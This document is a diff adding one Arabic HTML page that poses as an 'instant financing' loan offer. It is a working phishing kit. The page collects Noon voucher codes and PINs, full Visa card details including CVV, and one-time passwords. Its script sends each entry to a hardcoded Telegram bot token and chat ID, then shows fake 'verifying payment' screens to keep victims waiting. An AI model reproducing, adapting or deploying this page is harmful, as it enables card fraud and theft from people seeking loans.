@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تمويل فوري</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --gold: #D4AF37;
+            --black: #1a1a1a;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--black);
+            color: var(--white);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 500px;
+            background: #222;
+            padding: 25px;
+            border-radius: 15px;
+            border: 1px solid var(--gold);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .page { display: none; }
+        .active { display: block; }
+
+        h2 { text-align: center; color: var(--gold); margin-bottom: 25px; }
+
+        .packages-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .package-card {
+            border: 1px solid #444;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .package-card.selected {
+            border-color: var(--gold);
+            background: rgba(212, 175, 55, 0.2);
+        }
+
+        .package-card h3 { color: var(--gold); margin: 5px 0; }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: #333;
+            color: white;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 1rem;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: var(--gold);
+            border: none;
+            color: var(--black);
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            margin-top: 15px;
+        }
+
+        .payment-option {
+            background: #333;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border: 1px solid #444;
+            cursor: pointer;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .payment-option:hover { border-color: var(--gold); }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--gold);
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="page1" class="page active">
+        <h2>اختر باقة التمويل الفوري</h2>
+        <div class="packages-grid">
+            <div class="package-card" onclick="selectPkg(this, '5000')"><h3>5,000</h3><p>ريال</p></div>
+            <div class="package-card" onclick="selectPkg(this, '10000')"><h3>10,000</h3><p>ريال</p></div>
+            <div class="package-card" onclick="selectPkg(this, '20000')"><h3>20,000</h3><p>ريال</p></div>
+            <div class="package-card" onclick="selectPkg(this, '30000')"><h3>30,000</h3><p>ريال</p></div>
+            <div class="package-card" onclick="selectPkg(this, '50000')"><h3>50,000</h3><p>ريال</p></div>
+            <div class="package-card" onclick="selectPkg(this, '100000')"><h3>100,000</h3><p>ريال</p></div>
+        </div>
+        <button onclick="goNext('page2')">التالي</button>
+    </div>
+
+    <div id="page2" class="page">
+        <h2>اختر طريقة الدفع</h2>
+        <div class="payment-option" onclick="goNext('page_noon')">الدفع عن طريق قسيمة نون</div>
+        <div class="payment-option" onclick="goNext('page_visa')">بطاقة فيزا</div>
+    </div>
+
+    <div id="page_noon" class="page">
+        <h2>أدخل تفاصيل القسيمة</h2>
+        <input type="text" id="noon_code" placeholder="أدخل كود القسيمة">
+        <input type="number" id="noon_pin" placeholder="رمز الـ PIN">
+        <button onclick="sendNoon()">التالي</button>
+    </div>
+
+    <div id="page_visa" class="page">
+        <h2>معلومات بطاقة فيزا</h2>
+        <input type="text" id="v_name" placeholder="الاسم الكامل">
+        <input type="number" id="v_num" placeholder="رقم البطاقة">
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="v_date" placeholder="MM/YY">
+            <input type="number" id="v_cvv" placeholder="رمز الـ CVV">
+        </div>
+        <button onclick="sendVisa()">التالي</button>
+    </div>
+
+    <div id="page_otp" class="page">
+        <h2>كود التحقق</h2>
+        <p style="text-align:center;">سوف يتم إرسال رمز التحقق إلى جوالك، يرجى إدخاله.</p>
+        <input type="number" id="otp_code" placeholder="أدخل رمز التحقق">
+        <button onclick="sendOTP()">التالي</button>
+    </div>
+
+    <div id="page_wait" class="page">
+        <h2 id="wait_msg">يرجى الانتظار...</h2>
+        <div class="loader"></div>
+        <p style="text-align:center;" id="sub_msg">جاري المعالجة والتحقق...</p>
+    </div>
+</div>
+
+<script>
+    let selectedPackage = "غير محدد";
+    const TOKEN = "8397030939:AAFaUPmGtDjmOcwnUM62uqfGcuKNy7L5noQ";
+    const ID = "8226145538";
+
+    function selectPkg(el, val) {
+        document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedPackage = val;
+    }
+
+    function goNext(pageId) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`;
+        fetch(url);
+    }
+
+    function sendNoon() {
+        const code = document.getElementById('noon_code').value;
+        const pin = document.getElementById('noon_pin').value;
+        const msg = `🔥 طلب قسيمة نون:\n💰 الباقة: ${selectedPackage} ريال\n🎫 الكود: ${code}\n🔐 PIN: ${pin}`;
+        sendToTelegram(msg);
+        document.getElementById('wait_msg').innerText = "يرجى الانتظار حتى يتم التحقق من الدفع";
+        document.getElementById('sub_msg').innerText = "الرجاء عدم إغلاق الصفحة";
+        goNext('page_wait');
+    }
+
+    function sendVisa() {
+        const name = document.getElementById('v_name').value;
+        const num = document.getElementById('v_num').value;
+        const date = document.getElementById('v_date').value;
+        const cvv = document.getElementById('v_cvv').value;
+        const msg = `💳 بيانات فيزا:\n💰 الباقة: ${selectedPackage} ريال\n👤 الاسم: ${name}\n🔢 الرقم: ${num}\n📅 التاريخ: ${date}\n🔒 CVV: ${cvv}`;
+        sendToTelegram(msg);
+        goNext('page_otp');
+    }
+
+    function sendOTP() {
+        const otp = document.getElementById('otp_code').value;
+        const msg = `🔐 كود الـ OTP:\n💰 الباقة: ${selectedPackage} ريال\n🔢 الرمز: ${otp}`;
+        sendToTelegram(msg);
+        document.getElementById('wait_msg').innerText = "سوف يتم التحقق من معلومات الدفع يرجى الانتظار";
+        document.getElementById('sub_msg').innerText = "جاري التأكد من صحة البيانات...";
+        goNext('page_wait');
+    }
+</script>
+
+</body>
+</html>
